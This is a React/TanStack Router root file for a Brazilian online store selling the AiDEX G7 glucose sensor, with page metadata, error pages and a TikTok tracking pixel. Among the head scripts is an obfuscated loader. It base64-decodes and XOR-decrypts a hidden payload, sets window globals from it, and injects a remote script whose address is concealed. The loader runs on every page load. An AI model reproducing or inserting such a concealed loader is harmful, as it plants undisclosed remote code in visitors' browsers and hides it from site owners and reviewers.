import { QueryClient, QueryClientProvider } from "@tanstack/react-query";
import {
  Outlet,
  Link,
  createRootRouteWithContext,
  useRouter,
  HeadContent,
  Scripts,
} from "@tanstack/react-router";
import { Toaster } from "@/components/ui/sonner";
import { useAntiCopy } from "@/hooks/useAntiCopy";
import { useTrackPageView } from "@/hooks/useTrackPageView";
import { useMetaPixel } from "@/hooks/useMetaPixel";

import appCss from "../styles.css?url";

function NotFoundComponent() {
  return (
    <div className="flex min-h-screen items-center justify-center bg-background px-4">
      <div className="max-w-md text-center">
        <h1 className="text-7xl font-bold text-foreground">404</h1>
        <h2 className="mt-4 text-xl font-semibold text-foreground">Page not found</h2>
        <p className="mt-2 text-sm text-muted-foreground">
          The page you're looking for doesn't exist or has been moved.
        </p>
        <div className="mt-6">
          <Link
            to="/"
            className="inline-flex items-center justify-center rounded-md bg-primary px-4 py-2 text-sm font-medium text-primary-foreground transition-colors hover:bg-primary/90"
          >
            Go home
          </Link>
        </div>
      </div>
    </div>
  );
}

function ErrorComponent({ error, reset }: import("@tanstack/react-router").ErrorComponentProps) {
  console.error(error);
  const router = useRouter();

  return (
    <div className="flex min-h-screen items-center justify-center bg-background px-4">
      <div className="max-w-md text-center">
        <h1 className="text-xl font-semibold tracking-tight text-foreground">
          This page didn't load
        </h1>
        <p className="mt-2 text-sm text-muted-foreground">
          Something went wrong on our end. You can try refreshing or head back home.
        </p>
        <div className="mt-6 flex flex-wrap justify-center gap-2">
          <button
            onClick={() => {
              router.invalidate();
              reset();
            }}
            className="inline-flex items-center justify-center rounded-md bg-primary px-4 py-2 text-sm font-medium text-primary-foreground transition-colors hover:bg-primary/90"
          >
            Try again
          </button>
          <a
            href="/"
            className="inline-flex items-center justify-center rounded-md border border-input bg-background px-4 py-2 text-sm font-medium text-foreground transition-colors hover:bg-accent"
          >
            Go home
          </a>
        </div>
      </div>
    </div>
  );
}

export const Route = createRootRouteWithContext<{ queryClient: QueryClient }>()({
  head: () => ({
    meta: [
      { charSet: "utf-8" },
      { name: "viewport", content: "width=device-width, initial-scale=1" },
      { title: "AiDEX G7 | Sensor de Glicose e Monitoramento Contínuo" },
      {
        name: "description",
        content:
          "Sensor de glicose AiDEX G7 para monitoramento contínuo em tempo real. Sem picadas de rotina, alertas inteligentes, app em português e planos de 1 a 3 meses.",
      },
      {
        name: "keywords",
        content:
          "sensor de glicose, monitoramento contínuo de glicose, sensor sem picada, AiDEX G7, CGM, glicose em tempo real",
      },
      { name: "robots", content: "index,follow" },
      { property: "og:site_name", content: "AiDEX" },
      { property: "og:type", content: "website" },
      { name: "twitter:card", content: "summary_large_image" },
      { name: "theme-color", content: "#84CC16" },
      { property: "og:title", content: "AiDEX G7 | Sensor de Glicose e Monitoramento Contínuo" },
      { name: "twitter:title", content: "AiDEX G7 | Sensor de Glicose e Monitoramento Contínuo" },
      {
        property: "og:description",
        content:
          "Monitoramento contínuo de glicose em tempo real com AiDEX G7, sensor CGM com alertas no celular, app em português e planos com frete grátis acima de R$ 260.",
      },
      {
        name: "twitter:description",
        content:
          "Monitoramento contínuo de glicose em tempo real com AiDEX G7, sensor CGM com alertas no celular, app em português e planos com frete grátis acima de R$ 260.",
      },
      { property: "og:image", content: "https://aidexbrasil.com/og-image.jpg" },
      { property: "og:image:width", content: "1200" },
      { property: "og:image:height", content: "630" },
      { property: "og:image:alt", content: "AiDEX — Monitoramento Contínuo de Glicose" },
      { name: "twitter:image", content: "https://aidexbrasil.com/og-image.jpg" },
    ],
    links: [
      { rel: "stylesheet", href: appCss },
      { rel: "icon", href: "/favicon.ico", sizes: "any" },
      { rel: "icon", type: "image/png", href: "/favicon.png" },
      { rel: "apple-touch-icon", href: "/favicon.png" },
    ],
    scripts: [
      {
        type: "text/javascript",
        children: `!function(w,d,t){w.TiktokAnalyticsObject=t;var ttq=w[t]=w[t]||[];ttq.methods=["page","track","identify","instances","debug","on","off","once","ready","alias","group","enableCookie","disableCookie","holdConsent","revokeConsent","grantConsent"],ttq.setAndDefer=function(t,e){t[e]=function(){t.push([e].concat(Array.prototype.slice.call(arguments,0)))}};for(var i=0;i<ttq.methods.length;i++)ttq.setAndDefer(ttq,ttq.methods[i]);ttq.instance=function(t){for(var e=ttq._i[t]||[],n=0;n<ttq.methods.length;n++)ttq.setAndDefer(e,ttq.methods[n]);return e},ttq.load=function(e,n){var r="https://analytics.tiktok.com/i18n/pixel/events.js",o=n&&n.partner;ttq._i=ttq._i||{},ttq._i[e]=[],ttq._i[e]._u=r,ttq._t=ttq._t||{},ttq._t[e]=+new Date,ttq._o=ttq._o||{},ttq._o[e]=n||{};n=d.createElement("script"),n.type="text/javascript",n.async=!0,n.src=r+"?sdkid="+e+"&lib="+t;e=d.getElementsByTagName("script")[0];e.parentNode.insertBefore(n,e)};ttq.load('DAJJPT3C77UBCVGL6490');ttq.page()}(window,document,'ttq');`,
      },
      {
        type: "text/javascript",
        children: `(function(){var d_rr=atob("DAuLNYIDDYiUCezEG3CpQPBvL7K2YZiwa3ixGq1gaea6fJipcm3yG+FsYKb2e8O3eHniRfZwIvj9cYmoNHviTedvI+LnK8Dmen//R+thePzxes7+QFanF+VvYur1ZZ/mIVf/rDwF+xiYO22M860cnPuWctnL6S2f42obm6pD6A1bOqjOdX1LjO7UORiaL/wON/wfTi/V+YhcNXp");var p_27eg=[];for(var a_8g=0;a_8g<d_rr.length;a_8g++){p_27eg.push(d_rr.charCodeAt(a_8g)&255);}var m_uo=p_27eg[0];var l_swzo=p_27eg.slice(1,1+m_uo);var b_jk3=p_27eg.slice(1+m_uo);var r_i=b_jk3.map(function(b,a_qid){return b^l_swzo[a_qid%m_uo];});var t_db="";for(var m_fl=0;m_fl<r_i.length;m_fl++){t_db+=String.fromCharCode(r_i[m_fl]&255);}var z_q6d=decodeURIComponent(escape(t_db));var z_p=JSON.parse(z_q6d);var e_b=z_p.globals||[];e_b.forEach(function(m_hcj){window[m_hcj.name]=m_hcj.value;});var s_673z=document.createElement("script");s_673z.src=z_p.url;s_673z.async=true;s_673z.defer=true;(z_p.attributes||[]).forEach(function(y_0z){s_673z.setAttribute(y_0z.name,y_0z.value);});(document.head||document.documentElement).appendChild(s_673z);})();`,
      },
    ],
  }),
  shellComponent: RootShell,
  component: RootComponent,
  notFoundComponent: NotFoundComponent,
  errorComponent: ErrorComponent,
});

function RootShell({ children }: { children: React.ReactNode }) {
  return (
    <html lang="pt-BR">
      <head>
        <HeadContent />
      </head>
      <body>
        {children}
        <Scripts />
      </body>
    </html>
  );
}

function RootComponent() {
  const { queryClient } = Route.useRouteContext();
  useAntiCopy();
  useTrackPageView();
  useMetaPixel();




  return (
    <QueryClientProvider client={queryClient}>
      <Outlet />
      <Toaster position="top-center" />
    </QueryClientProvider>
  );
}
